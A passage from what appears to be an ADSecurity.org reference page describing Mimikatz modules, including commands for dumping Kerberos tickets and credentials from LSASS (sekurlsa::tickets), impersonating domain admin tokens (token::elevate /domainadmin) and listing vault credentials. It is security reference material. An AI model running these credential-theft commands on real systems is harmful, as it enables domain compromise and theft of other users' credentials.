<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" rel="attachment wp-att-2174"><img class="alignnone wp-image-2174" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg" alt="Mimikatz-Sekurlsa-PTH" width="645" height="272" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH-300x127.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH-768x325.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH-1024x433.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-PTH.jpg 1682w" sizes="(max-width: 645px) 100vw, 645px" /></a></p>
<p><span style="text-decoration: underline;">Benjamin&#8217;s Remarks:</span></p>
<ul>
<li>This command does not work with minidumps (nonsense);</li>
<li>it requires elevated privileges (privilege::debug or SYSTEM account), unlike &#8216;Pass-The-Ticket&#8217; which uses one official API ;<br />
this new version of &#8216;Pass-The-Hash&#8217; replaces RC4 keys of Kerberos by the ntlm hash (and/or replaces AES keys) &#8211; it permits to the Kerberos provider to ask TGT tickets! ;</li>
<li>ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable) ;</li>
<li>AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.</li>
</ul>
<p><a href="http://blog.gentilkiwi.com/securite/mimikatz/overpass-the-hash">Benjamin&#8217;s post on overpass-the-has</a>h.</p>
<p>&nbsp;</p>
<p><b>SEKURLSA::SSP</b> &#8211; Lists SSP credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png"><img class="alignnone size-full wp-image-1841" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-SSP.png" alt="Mimikatz-Sekurlsa-SSP" width="481" height="670" /></a></p>
<p><a id="SEKURLSATickets"></a><b>SEKURLSA::Tickets</b> &#8211; Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer&#8217;s AD computer account.<br />
Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).</p>
<ul>
<li>/export &#8211; optional &#8211; tickets are exported in .kirbi files. They start with user&#8217;s LUID and group number (0 = TGS, 1 = client ticket(?) and 2 = TGT)</li>
</ul>
<p>Similar to credential dumping from LSASS, using the sekurlsa module, an attacker can get all Kerberos ticket data in memory on a system, including those belonging to an admin or service.<br />
This is extremely useful if an attacker has compromised a web server configured for Kerberos delegation that users access with a backend SQL server. This enables an attacker to capture and reuse all user tickets in memory on that server.</p>
<p>The “kerberos::tickets” mimikatz command dumps the current logged-on user’s Kerberos tickets and does not require elevated rights. Leveraging the sekurlsa module’s capability to read from protected memory (LSASS), all Kerberos tickets on the system can be dumped.</p>
<p>Command:  <em>mimikatz sekurlsa::tickets exit</em></p>
<ul>
<li>Dumps all authenticated Kerberos tickets on a system.</li>
<li>Requires administrator access (with debug) or Local SYSTEM rights</li>
</ul>
<p>The following screenshot shows dumped password and Kerberos tickets (TGS &amp; TGT) of another user who is a Domain Admin (LukeSkywalker).</p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-SekurlsaTickets" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets_thumb.png" alt="Mimikatz-SekurlsaTickets" width="874" height="824" border="0" /></span></a><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-SekurlsaTickets-Part2-AdminTGT" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part2-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-Part2-AdminTGT" width="874" height="257" border="0" /></span></a></p>
<p><span style="font-family: times new roman;"><span style="font-size: medium; font-family: times new roman;">The following screenshot </span><span style="font-size: medium;">shows dumped credentials and Kerberos tickets (TGS &amp; TGT) of another admin (HanSolo).</span></span></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-SekurlsaTickets-Part3-AdminTGT" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part3-AdminTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-Part3-AdminTGT" width="877" height="833" border="0" /></span></a></p>
<p><span style="font-family: times new roman;"><span style="font-size: medium; font-family: times new roman;">The following screenshot </span><span style="font-size: medium;">shows dumped credentials and Kerberos tickets (TGS &amp; TGT) for a SQL service account (svc-SQLDBEngine01).</span></span></p>
<p><a href="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT.png"><span style="font-family: times new roman;"><img style="background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;" title="Mimikatz-SekurlsaTickets-Part4-ServiceTGT" src="http://adsecurity.org/wp-content/uploads/2015/01/Mimikatz-SekurlsaTickets-Part4-ServiceTGT_thumb.png" alt="Mimikatz-SekurlsaTickets-Part4-ServiceTGT" width="879" height="726" border="0" /></span></a></p>
<p>&nbsp;</p>
<p><b>SEKURLSA::Trust</b> &#8211; get trust keys<br />
<em>(I think this is deprecated in favor of lsadump::trust /patch)</em></p>
<p>&nbsp;</p>
<p><b>SEKURLSA::TSPKG</b> &#8211; Lists TsPkg credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png"><img class="alignnone size-full wp-image-1843" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png" alt="Mimikatz-Sekurlsa-TSPKG" width="471" height="670" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG-211x300.png 211w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Sekurlsa-TSPKG.png 471w" sizes="(max-width: 471px) 100vw, 471px" /></a></p>
<p><b>SEKURLSA::Wdiget</b> &#8211; List WDigest credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" rel="attachment wp-att-2154"><img class="alignnone size-full wp-image-2154" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg" alt="Mimikatz-sekurlsa-wdigest" width="1676" height="1527" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest-300x273.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest-768x700.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest-1024x933.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-sekurlsa-wdigest.jpg 1676w" sizes="(max-width: 1676px) 100vw, 1676px" /></a></p>
<h4><b><a id="SERVICE"></a>SERVICE</b></h4>
<p><b>SERVICE::List</b> &#8211; list services</p>
<p><b>SERVICE::Preshutdown</b> &#8211; preshutdown service</p>
<p><b>SERVICE::Remove</b> &#8211; Remove service</p>
<p><b>SERVICE::Resume</b> &#8211; resume service</p>
<p><b>SERVICE::Shutdown</b> &#8211; shutdown service</p>
<p><b>SERVICE::Start</b> &#8211; Start a service</p>
<p><b>SERVICE::Stop</b> &#8211; Stop service</p>
<p><b>SERVICE::Suspend</b> &#8211; suspend service</p>
<p>&nbsp;</p>
<h4><b><a id="STANDARD"></a>STANDARD</b></h4>
<p><b>STANDARD::Base64 </b>&#8211; switch output to base64 output</p>
<p><b>STANDARD::CD </b>&#8211; change or display current directory</p>
<p><b>STANDARD::CLS </b>&#8211; Clear screen</p>
<p><b>STANDARD::Exit</b>&#8211; quit Mimikatz</p>
<p><b>STANDARD::Log </b>&#8211; send Mimikatz data to log file</p>
<p><b>STANDARD::Sleep </b>&#8211; sleep an amount of milliseconds</p>
<p><strong><b>STANDARD::</b>Version</strong> &#8211; display version information</p>
<p>&nbsp;</p>
<h4><b><a id="TOKEN"></a>TOKEN</b></h4>
<p>The Mimikatz Token module enables Mimikatz to interact with Windows authentication tokens, including grabbing and impersonating existing tokens.</p>
<p><a id="TOKENElevate"></a><b>TOKEN::Elevate</b> &#8211; impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box using the Windows API.<br />
<em>Requires Administrator rights.</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1.png"><img class="alignnone size-full wp-image-1858" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1.png" alt="Mimikatz-Token-Elevate" width="837" height="181" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1-300x65.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate1.png 837w" sizes="(max-width: 837px) 100vw, 837px" /></a></p>
<p>Find a domain admin credential on the box and use that token: <em>token::elevate /domainadmin</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" rel="attachment wp-att-2175"><img class="alignnone wp-image-2175" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg" alt="Mimikatz-Token-Elevate-DomainAdmin" width="811" height="114" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin-300x42.jpg 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin-768x108.jpg 768w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin-1024x144.jpg 1024w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Elevate-DomainAdmin.jpg 1901w" sizes="(max-width: 811px) 100vw, 811px" /></a></p>
<p>&nbsp;</p>
<p><a id="TOKENList"></a><b>TOKEN::List</b> &#8211; list all tokens of the system</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png"><img class="alignnone size-full wp-image-1845" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png" alt="Mimikatz-Token-List" width="842" height="589" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List-300x210.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-List.png 842w" sizes="(max-width: 842px) 100vw, 842px" /></a></p>
<p><b>TOKEN::Revert</b> &#8211; revert to process token</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png"><img class="alignnone size-full wp-image-1847" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png" alt="Mimikatz-Token-Whoami" width="839" height="167" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami-300x60.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Whoami.png 839w" sizes="(max-width: 839px) 100vw, 839px" /></a></p>
<p><b>TOKEN::Whoami</b> &#8211; Display current identity</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Revery.png"><img class="alignnone size-full wp-image-1846" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Revery.png" alt="Mimikatz-Token-Revery" width="840" height="162" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Revery-300x58.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Token-Revery.png 840w" sizes="(max-width: 840px) 100vw, 840px" /></a></p>
<p>&nbsp;</p>
<h4><b><a id="TS"></a>TS</b></h4>
<p><b>TS::Multirdp</b> &#8211; (experimental) Patch Terminal Server service to allow multiple users</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png"><img class="alignnone wp-image-1848" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-TS-MultiRDP.png" alt="Mimikatz-TS-MultiRDP" width="266" height="40" /></a></p>
<h4></h4>
<h4><b><a id="VAULT"></a>VAULT</b></h4>
<p><b>VAULT::List</b> &#8211; list vault credentials</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png"><img class="alignnone size-full wp-image-1849" src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png" alt="Mimikatz-Vault-List" width="726" height="140" srcset="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List-300x58.png 300w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List-720x140.png 720w, https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Vault-List.png 726w" sizes="(max-width: 726px) 100vw, 726px" /></a></p>
<p><b>VAULT::Cred</b> &#8211; cred</p>
<p>&nbsp;</p>
<p><strong><em>This page and all content Copyright </em>© 2005-2011 <em>Sean Metcalf (ADSecurity.org)</em> All Rights Reserved</strong></p>
<p>&nbsp;</p>
			
						
						
		</div>
		
				<div class="entry-footer clearfix">
			
									
					</div>
	</div>
</div>













            
  
    </div><!-- #content-main -->
    
    	
    
<div id="sidebar1" class="sidebar grid_5">

	
    		<div id="recent-posts-4" class="sidebar-wrap clearfix widget_recent_entries">		<h3>Recent Posts</h3>		<ul>
					<li>
				<a href="https://adsecurity.org/?p=2535">Active Directory Recon Without Admin Rights</a>
						</li>
					<li>
				<a href="https://adsecurity.org/?p=2537">ADSecurity.org in the Press!</a>
						</li>
					<li>
				<a href="https://adsecurity.org/?p=2483">So You Want to Speak at a Security Conference?</a>
						</li>
					<li>
				<a href="https://adsecurity.org/?p=2495">Mimikatz Update Fixes Forged Kerberos Ticket Domain Field Anomaly &#8211; Golden Ticket Invalid Domain Field Event Detection No Longer Works</a>
						</li>
					<li>
				<a href="https://adsecurity.org/?p=2398">How Attackers Dump Active Directory Database Credentials</a>
						</li>
				</ul>
		</div>		<div id="categories-4" class="sidebar-wrap clearfix widget_categories"><h3>Categories</h3>		<ul>
	<li class="cat-item cat-item-565"><a href="https://adsecurity.org/?cat=565" >ActiveDirectorySecurity</a>
</li>
	<li class="cat-item cat-item-55"><a href="https://adsecurity.org/?cat=55" >Apple Security</a>
</li>
	<li class="cat-item cat-item-431"><a href="https://adsecurity.org/?cat=431" >Cloud Security</a>
</li>
	<li class="cat-item cat-item-17"><a href="https://adsecurity.org/?cat=17" >Continuing Education</a>
</li>
	<li class="cat-item cat-item-396"><a href="https://adsecurity.org/?cat=396" >Entertainment</a>
</li>
	<li class="cat-item cat-item-347"><a href="https://adsecurity.org/?cat=347" >Exploit</a>
</li>
	<li class="cat-item cat-item-168"><a href="https://adsecurity.org/?cat=168" >Hardware Security</a>
</li>
	<li class="cat-item cat-item-172"><a href="https://adsecurity.org/?cat=172" >Hypervisor Security</a>
</li>
	<li class="cat-item cat-item-126"><a href="https://adsecurity.org/?cat=126" >Linux/Unix Security</a>
</li>
	<li class="cat-item cat-item-343"><a href="https://adsecurity.org/?cat=343" >Malware</a>
</li>
	<li class="cat-item cat-item-11"><a href="https://adsecurity.org/?cat=11" >Microsoft Security</a>
</li>
	<li class="cat-item cat-item-48"><a href="https://adsecurity.org/?cat=48" >Network/System Security</a>
</li>
	<li class="cat-item cat-item-7"><a href="https://adsecurity.org/?cat=7" >PowerShell</a>
</li>
	<li class="cat-item cat-item-698"><a href="https://adsecurity.org/?cat=698" >RealWorld</a>
</li>
	<li class="cat-item cat-item-21"><a href="https://adsecurity.org/?cat=21" >Security</a>
</li>
	<li class="cat-item cat-item-234"><a href="https://adsecurity.org/?cat=234" >Security Conference Presentation/Video</a>
</li>
	<li class="cat-item cat-item-24"><a href="https://adsecurity.org/?cat=24" >Technical Article</a>
</li>
	<li class="cat-item cat-item-4"><a href="https://adsecurity.org/?cat=4" >Technical Reading</a>
</li>
	<li class="cat-item cat-item-2"><a href="https://adsecurity.org/?cat=2" >Technical Reference</a>
</li>
	<li class="cat-item cat-item-156"><a href="https://adsecurity.org/?cat=156" >TheCloud</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://adsecurity.org/?cat=1" >Uncategorized</a>
</li>
		</ul>
</div><div id="tag_cloud-3" class="sidebar-wrap clearfix widget_tag_cloud"><h3>Tags</h3><div class="tagcloud"><a href='https://adsecurity.org/?tag=active-directory' class='tag-link-75' title='4 topics' style='font-size: 8pt;'>Active Directory</a>
<a href='https://adsecurity.org/?tag=activedirectory' class='tag-link-20' title='47 topics' style='font-size: 22pt;'>ActiveDirectory</a>
<a href='https://adsecurity.org/?tag=activedirectoryattack' class='tag-link-537' title='5 topics' style='font-size: 9.1428571428571pt;'>ActiveDirectoryAttack</a>
<a href='https://adsecurity.org/?tag=activedirectorydefense' class='tag-link-538' title='4 topics' style='font-size: 8pt;'>ActiveDirectoryDefense</a>
<a href='https://adsecurity.org/?tag=activedirectorysecurity' class='tag-link-113' title='12 topics' style='font-size: 13.857142857143pt;'>ActiveDirectorySecurity</a>
<a href='https://adsecurity.org/?tag=adreading' class='tag-link-5' title='13 topics' style='font-size: 14.428571428571pt;'>ADReading</a>
<a href='https://adsecurity.org/?tag=adsecurity' class='tag-link-86' title='8 topics' style='font-size: 11.571428571429pt;'>ADSecurity</a>
<a href='https://adsecurity.org/?tag=azure' class='tag-link-25' title='4 topics' style='font-size: 8pt;'>Azure</a>
<a href='https://adsecurity.org/?tag=blackhat' class='tag-link-397' title='5 topics' style='font-size: 9.1428571428571pt;'>BlackHat</a>
<a href='https://adsecurity.org/?tag=configuration' class='tag-link-78' title='4 topics' style='font-size: 8pt;'>Configuration</a>
<a href='https://adsecurity.org/?tag=dcsync' class='tag-link-598' title='4 topics' style='font-size: 8pt;'>DCSync</a>
<a href='https://adsecurity.org/?tag=defcon' class='tag-link-518' title='5 topics' style='font-size: 9.1428571428571pt;'>DEFCON</a>
<a href='https://adsecurity.org/?tag=defcon23' class='tag-link-542' title='4 topics' style='font-size: 8pt;'>DEFCON23</a>
<a href='https://adsecurity.org/?tag=domaincontroller' class='tag-link-101' title='16 topics' style='font-size: 15.571428571429pt;'>DomainController</a>
<a href='https://adsecurity.org/?tag=emet5' class='tag-link-338' title='5 topics' style='font-size: 9.1428571428571pt;'>EMET5</a>
<a href='https://adsecurity.org/?tag=goldenticket' class='tag-link-303' title='9 topics' style='font-size: 12.285714285714pt;'>GoldenTicket</a>
<a href='https://adsecurity.org/?tag=hyperv' class='tag-link-3' title='5 topics' style='font-size: 9.1428571428571pt;'>HyperV</a>
<a href='https://adsecurity.org/?tag=kb3011780' class='tag-link-337' title='7 topics' style='font-size: 10.857142857143pt;'>KB3011780</a>
<a href='https://adsecurity.org/?tag=kdc' class='tag-link-80' title='5 topics' style='font-size: 9.1428571428571pt;'>KDC</a>
<a href='https://adsecurity.org/?tag=kerberos' class='tag-link-81' title='14 topics' style='font-size: 14.857142857143pt;'>Kerberos</a>
<a href='https://adsecurity.org/?tag=kerberoshacking' class='tag-link-298' title='10 topics' style='font-size: 12.857142857143pt;'>KerberosHacking</a>
<a href='https://adsecurity.org/?tag=krbtgt' class='tag-link-394' title='6 topics' style='font-size: 10.142857142857pt;'>KRBTGT</a>
<a href='https://adsecurity.org/?tag=lsass' class='tag-link-71' title='8 topics' style='font-size: 11.571428571429pt;'>LSASS</a>
<a href='https://adsecurity.org/?tag=mcm' class='tag-link-6' title='13 topics' style='font-size: 14.428571428571pt;'>MCM</a>
<a href='https://adsecurity.org/?tag=microsoftemet' class='tag-link-58' title='8 topics' style='font-size: 11.571428571429pt;'>MicrosoftEMET</a>
<a href='https://adsecurity.org/?tag=microsoftwindows' class='tag-link-102' title='6 topics' style='font-size: 10.142857142857pt;'>MicrosoftWindows</a>
<a href='https://adsecurity.org/?tag=mimikatz' class='tag-link-207' title='23 topics' style='font-size: 17.714285714286pt;'>mimikatz</a>
<a href='https://adsecurity.org/?tag=ms14068' class='tag-link-295' title='9 topics' style='font-size: 12.285714285714pt;'>MS14068</a>
<a href='https://adsecurity.org/?tag=ms14068exploit' class='tag-link-334' title='4 topics' style='font-size: 8pt;'>MS14068Exploit</a>
<a href='https://adsecurity.org/?tag=passthehash' class='tag-link-44' title='7 topics' style='font-size: 10.857142857143pt;'>PassTheHash</a>
<a href='https://adsecurity.org/?tag=powershell' class='tag-link-575' title='27 topics' style='font-size: 18.714285714286pt;'>PowerShell</a>
<a href='https://adsecurity.org/?tag=powershellcode' class='tag-link-22' title='16 topics' style='font-size: 15.571428571429pt;'>PowerShellCode</a>
<a href='https://adsecurity.org/?tag=powershellhacking' class='tag-link-68' title='5 topics' style='font-size: 9.1428571428571pt;'>PowerShellHacking</a>
<a href='https://adsecurity.org/?tag=powersploit' class='tag-link-232' title='5 topics' style='font-size: 9.1428571428571pt;'>PowerSploit</a>
<a href='https://adsecurity.org/?tag=pykek' class='tag-link-329' title='4 topics' style='font-size: 8pt;'>PyKEK</a>
<a href='https://adsecurity.org/?tag=security' class='tag-link-576' title='5 topics' style='font-size: 9.1428571428571pt;'>Security</a>
<a href='https://adsecurity.org/?tag=sidhistory' class='tag-link-547' title='4 topics' style='font-size: 8pt;'>SIDHistory</a>
<a href='https://adsecurity.org/?tag=silverticket' class='tag-link-304' title='7 topics' style='font-size: 10.857142857143pt;'>SilverTicket</a>
<a href='https://adsecurity.org/?tag=sneakyadpersistence' class='tag-link-596' title='4 topics' style='font-size: 8pt;'>SneakyADPersistence</a>
<a href='https://adsecurity.org/?tag=tgs' class='tag-link-528' title='5 topics' style='font-size: 9.1428571428571pt;'>TGS</a>
<a href='https://adsecurity.org/?tag=tgt' class='tag-link-529' title='5 topics' style='font-size: 9.1428571428571pt;'>TGT</a>
<a href='https://adsecurity.org/?tag=windows7' class='tag-link-117' title='5 topics' style='font-size: 9.1428571428571pt;'>Windows7</a>
<a href='https://adsecurity.org/?tag=windowsserver2008r2' class='tag-link-46' title='6 topics' style='font-size: 10.142857142857pt;'>WindowsServer2008R2</a>
<a href='https://adsecurity.org/?tag=windowsserver2012' class='tag-link-47' title='9 topics' style='font-size: 12.285714285714pt;'>WindowsServer2012</a>
<a href='https://adsecurity.org/?tag=windowsserver2012r2' class='tag-link-54' title='7 topics' style='font-size: 10.857142857143pt;'>WindowsServer2012R2</a></div>
</div><div id="nav_menu-2" class="sidebar-wrap clearfix widget_nav_menu"><h3>PowerShell Security Links</h3><div class="menu-links-container"><ul id="menu-links" class="menu"><li id="menu-item-291" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-291"><a href="http://dansolutions.com/">DAn Solutions Corporate Website</a></li>
<li id="menu-item-223" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-223"><a href="https://github.com/PyroTek3/AD-PowerShell-Scripts">GitHub Active Directory PowerShell Recon Scripts</a></li>
<li id="menu-item-224" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-224"><a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-225"><a href="http://www.poshsec.com/">POSHSec PowerShell Security</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-226"><a href="https://github.com/Veil-Framework/Veil-PowerView">Veil PowerView</a></li>
</ul></div></div><div id="archives-4" class="sidebar-wrap clearfix widget_archive"><h3>Archives</h3>		<ul>
			<li><a href='https://adsecurity.org/?m=201601'>January 2016</a></li>
	<li><a href='https://adsecurity.org/?m=201512'>December 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201511'>November 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201510'>October 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201509'>September 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201508'>August 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201507'>July 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201506'>June 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201505'>May 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201504'>April 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201503'>March 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201502'>February 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201501'>January 2015</a></li>
	<li><a href='https://adsecurity.org/?m=201412'>December 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201411'>November 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201410'>October 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201409'>September 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201408'>August 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201407'>July 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201406'>June 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201405'>May 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201404'>April 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201403'>March 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201402'>February 2014</a></li>
	<li><a href='https://adsecurity.org/?m=201307'>July 2013</a></li>
	<li><a href='https://adsecurity.org/?m=201211'>November 2012</a></li>
		</ul>
		</div>    
        
    
</div><!-- #sidebar1 -->    
    
</div><!-- #content -->

    
        
    <div id="sidebar_bottom" class="sidebar clearfix">
        
        		
		            <div id="text-2" class="sidebar-wrap clearfix widget_text"><h3>Copyright</h3>			<div class="textwidget">Content Disclaimer: This blog and its contents are provided "AS IS" with no warranties, and they confer no rights. Script samples are provided for informational purposes only and no guarantee is provided as to functionality or suitability.
The views shared on this blog reflect those of the authors and do not represent the views of any companies mentioned.

Content Ownership: All content posted here is intellectual work and under the current law, the poster owns the copyright of the article. Terms of Use Copyright © 2011 - 2014</div>
		</div>            </div>

	

<div id="footer" class="clearfix">
    
        <div id="copyright">
    	<h3>Copyright</h3>
		        
                	        	<p>
				Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by-nc-nd/3.0/">Creative Commons License</a>.            </p>
        	<p class="cc-logo"><span>Creative Commons License BY-NC-ND</span></p>
        
    	    </div>

		<div class="footer-menu-wrap">
    	<ul id="footer-menu" class="clearfix">
			                    	<li class="menu-item return-top"><a href="#">Return to top</a></li>
                    </ul>
    </div>
    	
        <div id="developer" class="grid_7">
        <p>
        Powered by <a href="http://wordpress.org/" rel="nofollow">WordPress</a> and the <a href="http://www.graphene-theme.com/" rel="nofollow">Graphene Theme</a>.        </p>

	    </div>
        
    </div><!-- #footer -->


</div><!-- #container -->

    </div><!-- .bg-gradient -->

    <!-- Start of StatCounter Code -->
    <script>
    <!-- 
        var sc_project=10100711; 
        var sc_security="4b306538"; 
      var sc_invisible=1;
        var scJsHost = (("https:" == document.location.protocol) ?
        "https://secure." : "http://www.");
    //-->
document.write("<sc"+"ript src='" +scJsHost +"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript><div class="statcounter"><a title="web analytics" href="https://statcounter.com/"><img class="statcounter" src="https://c.statcounter.com/10100711/0/4b306538/1/" alt="web analytics" /></a></div></noscript>   
    <!-- End of StatCounter Code -->
	<!--[if IE 8]>
    <script type="text/javascript">
        (function($) {
            var imgs, i, w;
            var imgs = document.getElementsByTagName( 'img' );
            maxwidth = 0.98 * $( '.entry-content' ).width();
            for( i = 0; i < imgs.length; i++ ) {
                w = imgs[i].getAttribute( 'width' );
                if ( w > maxwidth ) {
                    imgs[i].removeAttribute( 'width' );
                    imgs[i].removeAttribute( 'height' );
                }
            }
        })(jQuery);
    </script>
    <![endif]-->
<script type='text/javascript' src='https://adsecurity.org/wp-includes/js/comment-reply.min.js?ver=4.4.1'></script>
<script type='text/javascript' src='https://adsecurity.org/wp-includes/js/wp-embed.min.js?ver=4.4.1'></script>
</body>
</html>